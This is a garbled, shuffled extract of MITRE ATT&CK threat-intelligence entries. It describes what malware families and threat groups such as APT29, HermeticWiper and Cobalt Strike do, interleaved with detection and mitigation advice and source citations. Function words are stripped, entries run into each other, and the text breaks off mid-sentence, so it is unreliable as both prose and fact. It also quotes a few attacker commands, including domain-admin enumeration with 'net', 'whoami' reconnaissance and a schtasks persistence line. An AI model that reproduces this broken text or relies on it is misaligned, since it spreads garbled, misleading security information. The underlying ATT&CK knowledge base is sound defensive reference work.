[InvisiMole](https://attack.mitre.org/software/S0260) WinRAR compress data intended exfiltrated.(Citation: ESET InvisiMole June 2018) (Citation: ESET Turla August 2018)(Citation: ESET Crutch December 2020) Filter network traffic unusual non-standard protocols. [RedLeaves](https://attack.mitre.org/software/S0153) gather browser usernames passwords.(Citation: Accenture Hogfish April 2018) [POWRUNER](https://attack.mitre.org/software/S0184) collect process running <code>tasklist</code> victim.(Citation: FireEye APT34 Dec 2017) [OilRig](https://attack.mitre.org/groups/G0049) <code>net /domain</code>, <code>net “domain admins” /domain</code>, <code>net “Exchange Trusted Subsystem” /domain</code> domain permission settings.(Citation: Palo Alto OilRig 2016) Scan file objects reported PsSetCreateProcessNotifyRoutine, (Citation: PsSetCreateProcessNotifyRoutine routine) triggers callback process created deleted, file objects enabled write access. (Citation: BlackHat Process Doppelgänging Dec 2017) comparing file objects loaded memory file disk. (Citation: hasherezade Process Doppelgänging Dec 2017) [Carbon](https://attack.mitre.org/software/S0335) command <code>net time \\127.0.0.1</code> system’s time.(Citation: GovCERT Carbon 2016) [FoggyWeb](https://attack.mitre.org/software/S0661) compile execute source code compromised FS server specific POST.(Citation: MSTIC FoggyWeb September 2021) [CHOPSTICK](https://attack.mitre.org/software/S0023) store RC4 encrypted configuration Windows Registry.(Citation: FireEye APT28) [TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) execute <code>ProcessList</code> process discovery.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE 2020) [Chaes](https://attack.mitre.org/software/S0631) VBscript execute malicious code.(Citation: Cybereason Chaes Nov 2020)  [HermeticWiper](https://attack.mitre.org/software/S0697) recursively wipe folders files `Windows`, `Program Files`, `Program Files(x86)`, `PerfLogs`, `Boot, System`, `Volume Information`, `AppData` folders `FSCTL_MOVE_FILE`. [HermeticWiper](https://attack.mitre.org/software/S0697) overwrite symbolic links files `My Documents` Desktop random bytes.(Citation: ESET Hermetic Wizard March 2022) [Agent Tesla](https://attack.mitre.org/software/S0331) download additional files execution victim’s machine.(Citation: Talos Agent Tesla Oct 2018)(Citation: DigiTrust Agent Tesla Jan 2017)  [AuTo Stealer](https://attack.mitre.org/software/S1029) `cmd.exe` execute created batch file.(Citation: MalwareBytes SideCopy Dec 2021) [PyDCrypt](https://attack.mitre.org/software/S1032) dropped [DCSrv](https://attack.mitre.org/software/S1033) `svchost.exe` disk.(Citation: Checkpoint MosesStaff Nov 2021)
 [Higaisa](https://attack.mitre.org/groups/G0126)’s JavaScript file legitimate Office 2007 package side-load <code>OINFO12.OCX</code> dynamic link library.(Citation: PTSecurity Higaisa 2020) [APT29](https://attack.mitre.org/groups/G0016) configured Exchange virtual directory <code>Get-WebServicesVirtualDirectory</code>.(Citation: Volexity SolarWinds) Monitor drive letters mount data storage devices attempts read sensitive locations partition boot sector, master boot record, disk partition table, BIOS parameter block/superblock. [Trojan.Karagany](https://attack.mitre.org/software/S0094) samples common binary packers UPX Aspack custom Delphi binary packer.(Citation: Symantec Dragonfly)(Citation: Secureworks Karagany July 2019) [Tasklist](https://attack.mitre.org/software/S0057) discover services running system.(Citation: Tasklist) Operate intrusion detection, analysis, response systems separate network production environment lessen chances adversary interfere critical response functions. Enforce execution signed PowerShell scripts. Sign profiles avoid modified. [jRAT](https://attack.mitre.org/software/S0283) list local services.(Citation: Kaspersky Adwind Feb 2016) [Bisonal](https://attack.mitre.org/software/S0268) loaded `.wll` extension ` %APPDATA%\microsoft\word\startup\` repository.(Citation: Talos Bisonal Mar 2020)  [Sandworm Team](https://attack.mitre.org/groups/G0034) large-scale botnet target Office/Home Office (SOHO) network devices.(Citation: NCSC Cyclops Blink February 2022) [APT1](https://attack.mitre.org/groups/G0006) registered hundreds domains operations.(Citation: Mandiant APT1) [RGDoor](https://attack.mitre.org/software/S0258) encrypts files XOR sending C2 server.(Citation: Unit 42 RGDoor Jan 2018) [Inception](https://attack.mitre.org/groups/G0100) file listing plugin collect file directories local remote drives.(Citation: Symantec Inception Framework March 2018) (Citation: ESET TeleBots Oct 2018) (Citation: Cylance Dust Storm) [Skidmap](https://attack.mitre.org/software/S0468) installed crontab.(Citation: Trend Micro Skidmap) auditing tools capable detecting privilege service abuse opportunities systems enterprise correct them.  [Okrum](https://attack.mitre.org/software/S0439)'s installer attempt achieve persistence creating scheduled task.(Citation: ESET Okrum July 2019) [Mis-Type](https://attack.mitre.org/software/S0084) `cmd.exe` commands compromised host.(Citation: Cylance Dust Storm) [MarkiRAT](https://attack.mitre.org/software/S0652) modify shortcut launches Telegram replacing path malicious payload launch legitimate executable.(Citation: Kaspersky Ferocious Kitten Jun 2021) [APT41](https://attack.mitre.org/groups/G0096) created user accounts adds User Admin groups.(Citation: FireEye APT41 Aug 2019)  [Stealth Falcon](https://attack.mitre.org/groups/G0038) malware gathers passwords multiple sources, including Internet Explorer, Firefox, Chrome.(Citation: Citizen Lab Stealth Falcon 2016) [Lizar](https://attack.mitre.org/software/S0681) PowerKatz plugin loaded address space PowerShell process reflective DLL loading.(Citation: BiZone Lizar 2021)  [APT29](https://attack.mitre.org/groups/G0016) spearphishing emails attachment deliver files exploits initial victims.(Citation: F-Secure Dukes)(Citation: FireEye APT29 Nov 2018)(Citation: ESET Dukes October 2019)(Citation: MSTIC NOBELIUM 2021)(Citation: ESET T3 Threat Report 2021)(Citation: Secureworks IRON HEMLOCK Profile) [SUNSPOT](https://attack.mitre.org/software/S0562) encrypted log entries collected stream cipher RC4 hard-coded key. AES128-CBC encrypted blobs [SUNBURST](https://attack.mitre.org/software/S0559) source code data extracted SolarWinds Orion <MsBuild.exe</code> process.(Citation: CrowdStrike SUNSPOT Implant January 2021) [Higaisa](https://attack.mitre.org/groups/G0126) function gather current time.(Citation: Zscaler Higaisa 2020) [BLUELIGHT](https://attack.mitre.org/software/S0657) exfiltrated data C2 channel.(Citation: Volexity InkySquid BLUELIGHT August 2021) [MarkiRAT](https://attack.mitre.org/software/S0652) upload data victim's machine C2 server.(Citation: Kaspersky Ferocious Kitten Jun 2021) [Lazarus Group](https://attack.mitre.org/groups/G0032) stopped MSExchangeIS service render Exchange contents inaccessible users.(Citation: Novetta Blockbuster Destructive Malware) Monitor unexpected deletion file (ex: Sysmon EID 23)  [ProLock](https://attack.mitre.org/software/S0654) WMIC execute scripts targeted hosts.(Citation: IB Ransomware September 2020) [TRITON](https://attack.mitre.org/software/S0609) attempts write dummy program memory fails reset Triconex controller.(Citation: FireEye TRITON 2017) [Cobalt Strike](https://attack.mitre.org/software/S0154) exploit vulnerabilities MS14-058.(Citation: Cobalt Strike TTPs Dec 2017)(Citation: Cobalt Strike Manual 4.3 November 2020) (Citation: Dell TG-3390)(Citation: SecureWorks BRONZE UNION June 2017)(Citation: Nccgroup Emissary Panda 2018)(Citation: Trend Micro DRBControl February 2020)(Citation: Profero APT27 December 2020) [KONNI](https://attack.mitre.org/software/S0356) collect username victim’s machine.(Citation: Talos Konni 2017) [Avaddon](https://attack.mitre.org/software/S0640) executed malicious JScript downloader.(Citation: Hornet Security Avaddon June 2020)(Citation: Awake Security Avaddon) [Valak](https://attack.mitre.org/software/S0476) communications C2.(Citation: Cybereason Valak 2020)(Citation: Unit 42 Valak July 2020) Malicious XDG autostart entries detected auditing file creation events <code>/etc/xdg/autostart</code> <code>~/.config/autostart</code> directories. Depending individual configurations, defenders query environment variables <code>$XDG_CONFIG_HOME</code> <code>$XDG_CONFIG_DIRS</code> determine paths Autostart entries. Autostart entry files legitimate packages considered suspicious. Suspicious entries identified comparing entries trusted baseline. [Imminent Monitor](https://attack.mitre.org/software/S0434) module performing remote desktop access.(Citation: QiAnXin APT-C-36 Feb2019) (Citation: Volexity Exchange Marauder March 2021) [Donut](https://attack.mitre.org/software/S0695) generate shellcode outputs execute VBScript.(Citation: Donut Github)	 [HermeticWiper](https://attack.mitre.org/software/S0697) executable signed legitimate certificate issued Hermetica Digital Ltd.(Citation: Symantec Ukraine Wipers February 2022)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: ESET Hermetic Wiper February 2022)(Citation: Qualys Hermetic Wiper March 2022) Restrict administrator accounts individuals possible, privilege principles.  Prevent credential overlap systems administrator privileged accounts, network non-network platforms, servers endpoints. Monitor scheduled jobs unexpected modifications execution launch [Gold Dragon](https://attack.mitre.org/software/S0249) collects endpoint victim's username basis downloading additional components C2 server.(Citation: McAfee Gold Dragon) [Ursnif](https://attack.mitre.org/software/S0386) gathered running processes.(Citation: TrendMicro Ursnif Mar 2015)(Citation: TrendMicro BKDR_URSNIF.SM) [QuasarRAT](https://attack.mitre.org/software/S0262) hide process windows requests invisible compromised user. Requests marked invisible user-agent string `Mozilla/5.0 (Macintosh; Intel Mac OS 10_9_3) AppleWebKit/537.75.14 (KHTML, Gecko) Version/7.0.3 Safari/7046A194A` [QuasarRAT](https://attack.mitre.org/software/S0262) Windows systems.(Citation: CISA AR18-352A Quasar RAT December 2018) [USBferry](https://attack.mitre.org/software/S0452) detect victim's file folder list.(Citation: TrendMicro Tropic Trooper 2020)	 Monitor executed commands arguments actions collect files system's connected removable media. example, data acquired Windows management tools Windows Management Instrumentation PowerShell. [Taidoor](https://attack.mitre.org/software/S0011) delivered spearphishing emails.(Citation: TrendMicro Taidoor) [Sandworm Team](https://attack.mitre.org/groups/G0034) crafted phishing emails malicious hyperlinks.(Citation: District Court Indictment GRU Unit 74455 October 2020) [BLACKCOFFEE](https://attack.mitre.org/software/S0069) capability create reverse shell.(Citation: FireEye APT17) [jRAT](https://attack.mitre.org/software/S0283) function delete files victim’s machine.(Citation: jRAT Symantec Aug 2018) (Citation: ESET T3 Threat Report 2021) [RedLeaves](https://attack.mitre.org/software/S0153) communicate C2 TCP custom binary protocol.(Citation: FireEye APT10 April 2017) [Ramsay](https://attack.mitre.org/software/S0458) schedule tasks Windows API maintain persistence.(Citation: Eset Ramsay 2020)	 [Cobalt Strike](https://attack.mitre.org/software/S0154)'s Beacon payload capable capturing screenshots.(Citation: cobaltstrike manual)(Citation: Amnesty Intl. Ocean Lotus February 2021)(Citation: Cobalt Strike Manual 4.3 November 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware IndiaIndia obtains sends C2 server network interface card’s configuration, including IP address, gateways, subnet mask, DHCP information, WINS available.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Loaders) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific protocol adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) [Koadic](https://attack.mitre.org/software/S0250) download additional files tools.(Citation: Github Koadic)(Citation: MalwareBytes LazyScripter Feb 2021) [build_downer](https://attack.mitre.org/software/S0471) ability <code>WinExec</code> API execute malware compromised host.(Citation: Trend Micro Tick November 2019) [WarzoneRAT](https://attack.mitre.org/software/S0670) ability control infected PC RDP.(Citation: Check Warzone Feb 2020) Monitor newly executed processes account creation, net.exe [SynAck](https://attack.mitre.org/software/S0242) abuses NTFS transactions launch conceal malicious processes.(Citation: SecureList SynAck Doppelgänging 2018)(Citation: Kaspersky Lab SynAck 2018) (Citation: Cybereason Molerats Dec 2020) [Sliver](https://attack.mitre.org/software/S0633) encode binary data .PNG file C2 communication.(Citation: GitHub Sliver HTTP) [Cobalt Strike](https://attack.mitre.org/software/S0154) spoof arguments spawned processes execute beacon commands.(Citation: Cobalt Strike Manual 4.3 November 2020) [FIN6](https://attack.mitre.org/groups/G0037) Pastebin Google Storage host content operations.(Citation: FireEye FIN6 Apr 2019)	
 [Leviathan](https://attack.mitre.org/groups/G0065) inserted garbage characters code, avoid anti-virus detection.(Citation: Proofpoint Leviathan Oct 2017) (Citation: CISA AA20-239A BeagleBoyz August 2020) DLLs written System32 correlate software patching suspicious. abnormal process behavior process loading malicious DLL. Data events viewed isolation, chain behavior lead activities, network connections Command Control, learning details environment Discovery, Lateral Movement. [Lazarus Group](https://attack.mitre.org/groups/G0032) SSL certificates C2 domains.(Citation: CISA AppleJeus Feb 2021) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors DLL included XOR-encoded section.(Citation: McAfee Night Dragon) [QakBot](https://attack.mitre.org/software/S0650) send stolen C2 nodes including passwords, accounts, emails.(Citation: Kaspersky QakBot September 2021) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors enumerated sessions users remote host, identified privileged users logged targeted system.(Citation: FoxIT Wocao December 2019) [APT17](https://attack.mitre.org/groups/G0025) created profile TechNet C2 infrastructure.(Citation: FireEye APT17) Monitor deployment suspicious unknown container images pods environment, containers running root.  [Equation](https://attack.mitre.org/groups/G0020) capability overwrite firmware hard drives manufacturers.(Citation: Kaspersky Equation QA)  [APT3](https://attack.mitre.org/groups/G0022) downloader Windows command <code>"cmd.exe" /C whoami</code>. tool execute commands remote computers.(Citation: FireEye Operation Double Tap)(Citation: Symantec Buckeye) [SUNSPOT](https://attack.mitre.org/software/S0562) created SolarWinds Orion software source file <code>.bk</code> extension backup original content, wrote [SUNBURST](https://attack.mitre.org/software/S0559) filename <code>.tmp</code> extension, moved [SUNBURST](https://attack.mitre.org/software/S0559) <code>MoveFileEx</code> original filename <code>.cs</code> extension compiled Orion software.(Citation: CrowdStrike SUNSPOT Implant January 2021) [HermeticWiper](https://attack.mitre.org/software/S0697) ability modify Registry disable crash dumps, colors compressed files, pop-up folders desktop items.(Citation: SentinelOne Hermetic Wiper February 2022)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Qualys Hermetic Wiper March 2022) [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) variety open-source reconnaissance red team tools discovery lateral movement.(Citation: ESET BackdoorDiplomacy Jun 2021) [NanHaiShu](https://attack.mitre.org/software/S0228) change Internet Explorer settings reduce warnings malware activity.(Citation: Proofpoint Leviathan Oct 2017) [Dridex](https://attack.mitre.org/software/S0384) collected list installed software system.(Citation: Checkpoint Dridex Jan 2021) variant [CloudDuke](https://attack.mitre.org/software/S0054) HTTPS C2.(Citation: F-Secure Dukes) [Mimikatz](https://attack.mitre.org/software/S0002) credential dumper implementation SSP.(Citation: Deply Mimikatz) [APT28](https://attack.mitre.org/groups/G0007) collected files network shared drives.(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) (Citation: Kaspersky CactusPete Aug 2020) [Ke3chang](https://attack.mitre.org/groups/G0004) [Mimikatz](https://attack.mitre.org/software/S0002) generate Kerberos golden tickets.(Citation: NCC APT15 Alive Strong) Windows 10, enable Attack Surface Reduction (ASR) rules block processes created [PsExec](https://attack.mitre.org/software/S0029) running. (Citation: win10_asr) [Lucifer](https://attack.mitre.org/software/S0532) ability identify username compromised host.(Citation: Unit 42 Lucifer June 2020) Monitor newly constructed network connections (typically port 22) [Valid Accounts](https://attack.mitre.org/techniques/T1078) log remote machines Secure (SSH). SSH legitimate depending environment it’s used. factors, access patterns activity occurs remote login, suspicious malicious behavior SSH. [Kerrdown](https://attack.mitre.org/software/S0585) distributed malicious e-mail attachments.(Citation: Amnesty Intl. Ocean Lotus February 2021) [LightNeuron](https://attack.mitre.org/software/S0395) encrypts configuration files AES-256.(Citation: ESET LightNeuron 2019) Monitor newly constructed files payloads [FIVEHANDS](https://attack.mitre.org/software/S0618) enumerate network shares mounted drives network.(Citation: NCC Fivehands June 2021) [EKANS](https://attack.mitre.org/software/S0605) removes backups Volume Shadow Copies disable restoration capabilities.(Citation: Dragos EKANS)(Citation: Palo Alto Unit 42 EKANS) [WellMail](https://attack.mitre.org/software/S0515) archive files compromised host.(Citation: CISA WellMail July 2020) application control configured block execution verclsid.exe required network prevent potential misuse adversaries. [MarkiRAT](https://attack.mitre.org/software/S0652) capture keystrokes compromised host.(Citation: Kaspersky Ferocious Kitten Jun 2021) [Mustang Panda](https://attack.mitre.org/groups/G0129) <code>InstallUtil.exe</code> execute malicious Beacon stager.(Citation: Anomali MUSTANG PANDA October 2019) [LazyScripter](https://attack.mitre.org/groups/G0140) hosted open-source remote access Trojans operations GitHub.(Citation: MalwareBytes LazyScripter Feb 2021) [Mis-Type](https://attack.mitre.org/software/S0084) downloaded additional malware files compromised host.(Citation: Cylance Dust Storm) [Chrommme](https://attack.mitre.org/software/S0667) download code C2.(Citation: ESET Gelsemium June 2021) [SideTwist](https://attack.mitre.org/software/S0610) encrypt C2 communications randomly generated key.(Citation: Check APT34 April 2021) [Inception](https://attack.mitre.org/groups/G0100) weaponized documents attached spearphishing emails reconnaissance initial compromise.(Citation: Kaspersky Cloud Atlas December 2014)(Citation: Symantec Inception Framework March 2018)(Citation: Unit 42 Inception November 2018)(Citation: Kaspersky Cloud Atlas August 2019) [WIRTE](https://attack.mitre.org/groups/G0090) named stage dropper `Kaspersky Update Agent` legitimate.(Citation: Kaspersky WIRTE November 2021) [Leafminer](https://attack.mitre.org/groups/G0077) scanned network services search vulnerabilities victim system.(Citation: Symantec Leafminer July 2018) [Micropsia](https://attack.mitre.org/software/S0339) creates command-line cmd.exe.(Citation: Radware Micropsia July 2018) [Tropic Trooper](https://attack.mitre.org/groups/G0081) created hidden directory <code>C:\ProgramData\Apple\Updates\</code> <code>C:\Users\Public\Documents\Flash\</code>.(Citation: TrendMicro Tropic Trooper Mar 2018)(Citation: TrendMicro Tropic Trooper 2020) [EXOTIC LILY](https://attack.mitre.org/groups/G1011) established social media profiles mimic employees targeted companies.(Citation: Google EXOTIC LILY March 2022) [TSCookie](https://attack.mitre.org/software/S0436) ability steal saved passwords Internet Explorer, Edge, Firefox, Chrome browsers.(Citation: JPCert TSCookie March 2018) [PoshC2](https://attack.mitre.org/software/S0378) enumerate local domain user account information.(Citation: GitHub PoshC2) [Pillowmint](https://attack.mitre.org/software/S0517) compressed stored registry key. [Pillowmint](https://attack.mitre.org/software/S0517) obfuscated AES key encryption.(Citation: Trustwave Pillowmint June 2020)	 vendors embedded network devices provide cryptographic signing ensure integrity operating images boot time.  Implement available, vendor guidelines. (Citation: Cisco IOS Software Integrity Assurance - Secure Boot) [DanBot](https://attack.mitre.org/software/S1014) Base64 encode payload.(Citation: SecureWorks August 2019) Follow practices restricting access privileged accounts avoid hostile programs accessing sensitive information. [Lucifer](https://attack.mitre.org/software/S0532) [certutil](https://attack.mitre.org/software/S0160) propagation Windows hosts intranets.(Citation: Unit 42 Lucifer June 2020) [Felismus](https://attack.mitre.org/software/S0171) collects current username sends C2 server.(Citation: Forcepoint Felismus Mar 2017) (Citation: TrendMicro EarthLusca 2022) Monitor processes, <code>certmgr.exe</code> (macOS) <code>certutil.exe</code> (Windows), install root certificates. system's root certificates change frequently. Monitor certificates installed malicious activity. (Citation: SpectorOps Code Signing Dec 2017) Check pre-installed certificates systems ensure unnecessary suspicious certificates present. list trustworthy root certificates online <code>authroot.stl</code>. (Citation: SpectorOps Code Signing Dec 2017) Sysinternals Sigcheck utility (<code>sigcheck[64].exe -tuv</code>) dump contents certificate store list valid certificates rooted Certificate Trust List. (Citation: Sigcheck 2017) [Smoke Loader](https://attack.mitre.org/software/S0226) adds Visual Basic script Startup folder deploy payload.(Citation: Malwarebytes SmokeLoader 2016) (Citation: Secureworks BRONZE BUTLER Oct 2017) [HEXANE](https://attack.mitre.org/groups/G1001) established fraudulent LinkedIn accounts impersonating department employees target potential victims fake job offers.(Citation: ClearSky Siamesekitten August 2021) [TYPEFRAME](https://attack.mitre.org/software/S0263) upload download files victim’s machine.(Citation: US-CERT TYPEFRAME June 2018) blocking download/transfer execution uncommon file types adversary campaigns, CHM files. Monitor DLL/PE file events, <code>Control_RunDLL</code> <code>ControlRunDLLAsUser</code> API functions shell32.dll. [WarzoneRAT](https://attack.mitre.org/software/S0670) create `HKCU\Software\Classes\Folder\shell\open\command` registry key privilege escalation.(Citation: Uptycs Warzone UAC Bypass November 2020)(Citation: Check Warzone Feb 2020)  Monitor external websites unplanned content changes. [BloodHound](https://attack.mitre.org/software/S0521) collect local members.(Citation: CrowdStrike BloodHound April 2018) [GravityRAT](https://attack.mitre.org/software/S0237) C2.(Citation: Talos GravityRAT) environment variables read history preserved.(Citation: Securing bash history) [DarkWatchman](https://attack.mitre.org/software/S0673) reports window names keylogger provide application context.(Citation: Prevailion DarkWatchman 2021) [POWERSTATS](https://attack.mitre.org/software/S0223) WMI queries retrieve data compromised hosts.(Citation: FireEye MuddyWater Mar 2018)(Citation: ClearSky MuddyWater Nov 2018) [SHUTTERSPEED](https://attack.mitre.org/software/S0217) collect information.(Citation: FireEye APT37 Feb 2018) [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) exploited Oracle WebLogic vulnerabilities initial compromise.(Citation: Secureworks REvil September 2019) [Sandworm Team](https://attack.mitre.org/groups/G0034) tool query Active Directory LDAP, discovering computers listed AD.(Citation: ESET Telebots Dec 2016)(Citation: Dragos Crashoverride 2018)  [Ke3chang](https://attack.mitre.org/groups/G0004) actors files network shares computers laterally.(Citation: Mandiant Operation Ke3chang November 2014)(Citation: NCC APT15 Alive Strong) [Patchwork](https://attack.mitre.org/groups/G0040) installed payload startup programs folder "Baidu Software Update." adds stage payload startup programs “Net Monitor."(Citation: Cymmetria Patchwork) dropped [QuasarRAT](https://attack.mitre.org/software/S0262) binaries files named microsoft_network.exe crome.exe.(Citation: Volexity Patchwork June 2018) [HermeticWiper](https://attack.mitre.org/software/S0697) disable pop-up folders desktop items delete Registry hide malicious services.(Citation: Crowdstrike DriveSlayer February 2022)(Citation: ESET Hermetic Wizard March 2022) Establish centralized logging instance activity, monitor review events reverting snapshot, rolling changes, changing persistence/type storage. Monitor events snapshots rollbacks VM configuration changes, occurring normal activity. reduce false positives, valid change management procedures introduce identifier logged change tag header) supported cloud provider, distinguish valid, expected actions malicious ones. [KOMPROGO](https://attack.mitre.org/software/S0156) capable retrieving infected system.(Citation: FireEye APT32 2017) [APT39](https://attack.mitre.org/groups/G0087) RDP lateral movement persistence, employing rdpwinst tool mangement multiple sessions.(Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer 2020) [Ursnif](https://attack.mitre.org/software/S0386) POSTs exfil gathered information.(Citation: TrendMicro Ursnif Mar 2015)(Citation: FireEye Ursnif Nov 2017)(Citation: ProofPoint Ursnif Aug 2016) [TrickBot](https://attack.mitre.org/software/S0266) VNC module monitor victim collect pivot valuable systems network (Citation: Trickbot VNC module July 2021)(Citation: Bitdefender Trickbot VNC module Whitepaper 2021) [Chimera](https://attack.mitre.org/groups/G0114)'s malware altered NTLM authentication program domain controllers [Chimera](https://attack.mitre.org/groups/G0114) login valid credential.(Citation: Cycraft Chimera April 2020)	 [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors relied victim enable macros malicious Word document email.(Citation: Talos Frankenstein June 2019) Identify block malicious software executed executed technique application control (Citation: Beechey 2010) tools, Windows Defender Application Control(Citation: Windows Defender Application Control), AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) [DEATHRANSOM](https://attack.mitre.org/software/S0616) HTTPS download files.(Citation: FireEye FiveHands April 2021) Monitor security settings MFA logon requirements, Azure Conditional Access Policies registration MFA applications.  [ThiefQuest](https://attack.mitre.org/software/S0595) hides user's <code>~/Library</code> directory <code>.</code> file 9 random characters.(Citation: wardle evilquest parti) [Gamaredon Group](https://attack.mitre.org/groups/G0047) collected files infected systems uploaded C2 server.(Citation: ESET Gamaredon June 2020) [MiniDuke](https://attack.mitre.org/software/S0051) DGA generate Twitter URLs C2.(Citation: ESET Dukes October 2019) [Agent Tesla](https://attack.mitre.org/software/S0331) list current running processes system.(Citation: Fortinet Agent Tesla June 2017) [Avaddon](https://attack.mitre.org/software/S0640) searched specific files prior encryption.(Citation: Arxiv Avaddon Feb 2021) (Citation: FireEye APT34 Dec 2017) [Rclone](https://attack.mitre.org/software/S1040) list files directories `ls`, `lsd`, `lsl` commands.(Citation: Rclone) [Final1stspy](https://attack.mitre.org/software/S0355) obtains list running processes.(Citation: Unit 42 Nokki Oct 2018) [Dridex](https://attack.mitre.org/software/S0384) POST requests HTTPS C2 communications.(Citation: Kaspersky Dridex 2017)(Citation: Checkpoint Dridex Jan 2021) (Citation: DarkReading FireEye FIN5 Oct 2015)(Citation: Mandiant FIN5 GrrCON Oct 2016) [KONNI](https://attack.mitre.org/software/S0356) delete files.(Citation: Talos Konni 2017) [Clambling](https://attack.mitre.org/software/S0660) send files victim's machine Dropbox.(Citation: Trend Micro DRBControl February 2020)(Citation: Talent-Jump Clambling February 2020) Monitor user account logs suspicious events: unusual login attempt source location, mismatch location login attempt smart device receiving 2FA/MFA request prompts, volume repeated login attempts, user's primary credentials compromised 2FA/MFA mechanism. [Keydnap](https://attack.mitre.org/software/S0276) keychaindump project read securityd memory.(Citation: synack 2016 review) [UNC2452](https://attack.mitre.org/groups/G0118) gained initial network access trojanized update SolarWinds Orion software.(Citation: FireEye SUNBURST Backdoor December 2020) [GALLIUM](https://attack.mitre.org/groups/G0093) created high-privileged domain user accounts maintain access victim networks.(Citation: Cybereason Soft Cell June 2019)(Citation: GALLIUM December 2019) [FELIXROOT](https://attack.mitre.org/software/S0267) checks installed security software antivirus firewall.(Citation: ESET GreyEnergy Oct 2018) [STARWHALE](https://attack.mitre.org/software/S1037) establish persistence installing startup folder, variant created `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OutlookM` registry key.(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: Mandiant UNC3313 Feb 2022) [ChChes](https://attack.mitre.org/software/S0144) encode C2 data custom technique utilizes Base64.(Citation: Palo Alto menuPass Feb 2017)(Citation: JPCERT ChChes Feb 2017)	 [Dtrack](https://attack.mitre.org/software/S0567) remove persistence delete itself.(Citation: Securelist Dtrack) [AdFind](https://attack.mitre.org/software/S0552) enumerate domain groups.(Citation: Red Canary Hospital Thwarted Ryuk October 2020)(Citation: FireEye FIN6 Apr 2019)(Citation: FireEye Ryuk Trickbot January 2019)(Citation: Symantec Bumblebee June 2022) [MuddyWater](https://attack.mitre.org/groups/G0069) JavaScript files execute [POWERSTATS](https://attack.mitre.org/software/S0223) payload.(Citation: ClearSky MuddyWater Nov 2018)(Citation: FireEye MuddyWater Mar 2018)(Citation: DHS CISA AA22-055A MuddyWater February 2022) Monitor newly constructed network connections received untrusted hosts uncommon data flows. analyzing packet contents detect application layer protocols, leveraging SSL/TLS inspection encrypted traffic, follow expected protocol standards traffic flows (e.g. unauthorized, gratuitous, anomalous traffic patterns attempting access network configuration content) [ServHelper](https://attack.mitre.org/software/S0382) download additional files execute.(Citation: Proofpoint TA505 Jan 2019)(Citation: Deep Instinct TA505 Apr 2019) [LaZagne](https://attack.mitre.org/software/S0349) perform credential dumping memory account password information.(Citation: GitHub LaZagne Dec 2018) [Transparent Tribe](https://attack.mitre.org/groups/G0134) embedded links malicious downloads e-mails.(Citation: Talos Oblique RAT March 2021)(Citation: Talos Transparent Tribe 2021) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. (Citation: Baumgartner Naikon 2015) [APT32](https://attack.mitre.org/groups/G0050) collected OS version victims. group's backdoors query Windows Registry gather information, macOS backdoor performs fingerprint machine connection C&C server. [APT32](https://attack.mitre.org/groups/G0050) executed shellcode identify infected host.(Citation: ESET OceanLotus)(Citation: ESET OceanLotus Mar 2019)(Citation: ESET OceanLotus macOS April 2019)(Citation: FireEye APT32 April 2020) [Crutch](https://attack.mitre.org/software/S0538) ability persist scheduled tasks.(Citation: ESET Crutch December 2020) [RATANKBA](https://attack.mitre.org/software/S0241) <code>tasklist /svc</code> display running tasks.(Citation: RATANKBA) [Torisma](https://attack.mitre.org/software/S0678) `WTSEnumerateSessionsW` monitor remote desktop connections.(Citation: McAfee Lazarus Nov 2020) [Nidiran](https://attack.mitre.org/software/S0118) download execute files.(Citation: Symantec Backdoor.Nidiran) [AppleJeus](https://attack.mitre.org/software/S0584) data C2 server <code>POST</code> requests.(Citation: CISA AppleJeus Feb 2021)(Citation: ObjectiveSee AppleJeus 2019) [ThiefQuest](https://attack.mitre.org/software/S0595) <code>CGEventTap</code> functions perform keylogging.(Citation: Trendmicro Evolving ThiefQuest 2020) [FELIXROOT](https://attack.mitre.org/software/S0267) encrypts strings backdoor custom XOR algorithm.(Citation: FireEye FELIXROOT July 2018)(Citation: ESET GreyEnergy Oct 2018) (Citation: Crowdstrike MUSTANG PANDA June 2018)(Citation: Anomali MUSTANG PANDA October 2019)(Citation: Secureworks BRONZE PRESIDENT December 2019)(Citation: Recorded Future REDDELTA July 2020)(Citation: McAfee Dianxun March 2021) [APT39](https://attack.mitre.org/groups/G0087) [Remexi](https://attack.mitre.org/software/S0375) collect usernames system.(Citation: Symantec Chafer Dec 2015) [LAPSUS$](https://attack.mitre.org/groups/G1004) leverage NordVPN egress targeting intended victims.(Citation: MSTIC DEV-0537 Mar 2022) Monitor files user directories. [FunnyDream](https://attack.mitre.org/software/S1044) `rundll32` execution components.(Citation: Bitdefender FunnyDream Campaign November 2020) [4H RAT](https://attack.mitre.org/software/S0065) capability create remote shell.(Citation: CrowdStrike Putter Panda) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [Tomiris](https://attack.mitre.org/software/S0671) `SCHTASKS /CREATE /SC DAILY /TN StartDVL /TR "[path self]" /ST 10:00` establish persistence.(Citation: Kaspersky Tomiris Sep 2021) [PsExec](https://attack.mitre.org/software/S0029) leverage Windows services escalate privileges administrator <code>-s</code> argument.(Citation: Russinovich Sysinternals) (Citation: DFIR Ryuk's Return October 2020)(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: DFIR Ryuk 5 Hours October 2020) Windows 8.1, Windows Server 2012 R2, versions LSA Protected Process Light (PPL) setting Registry key 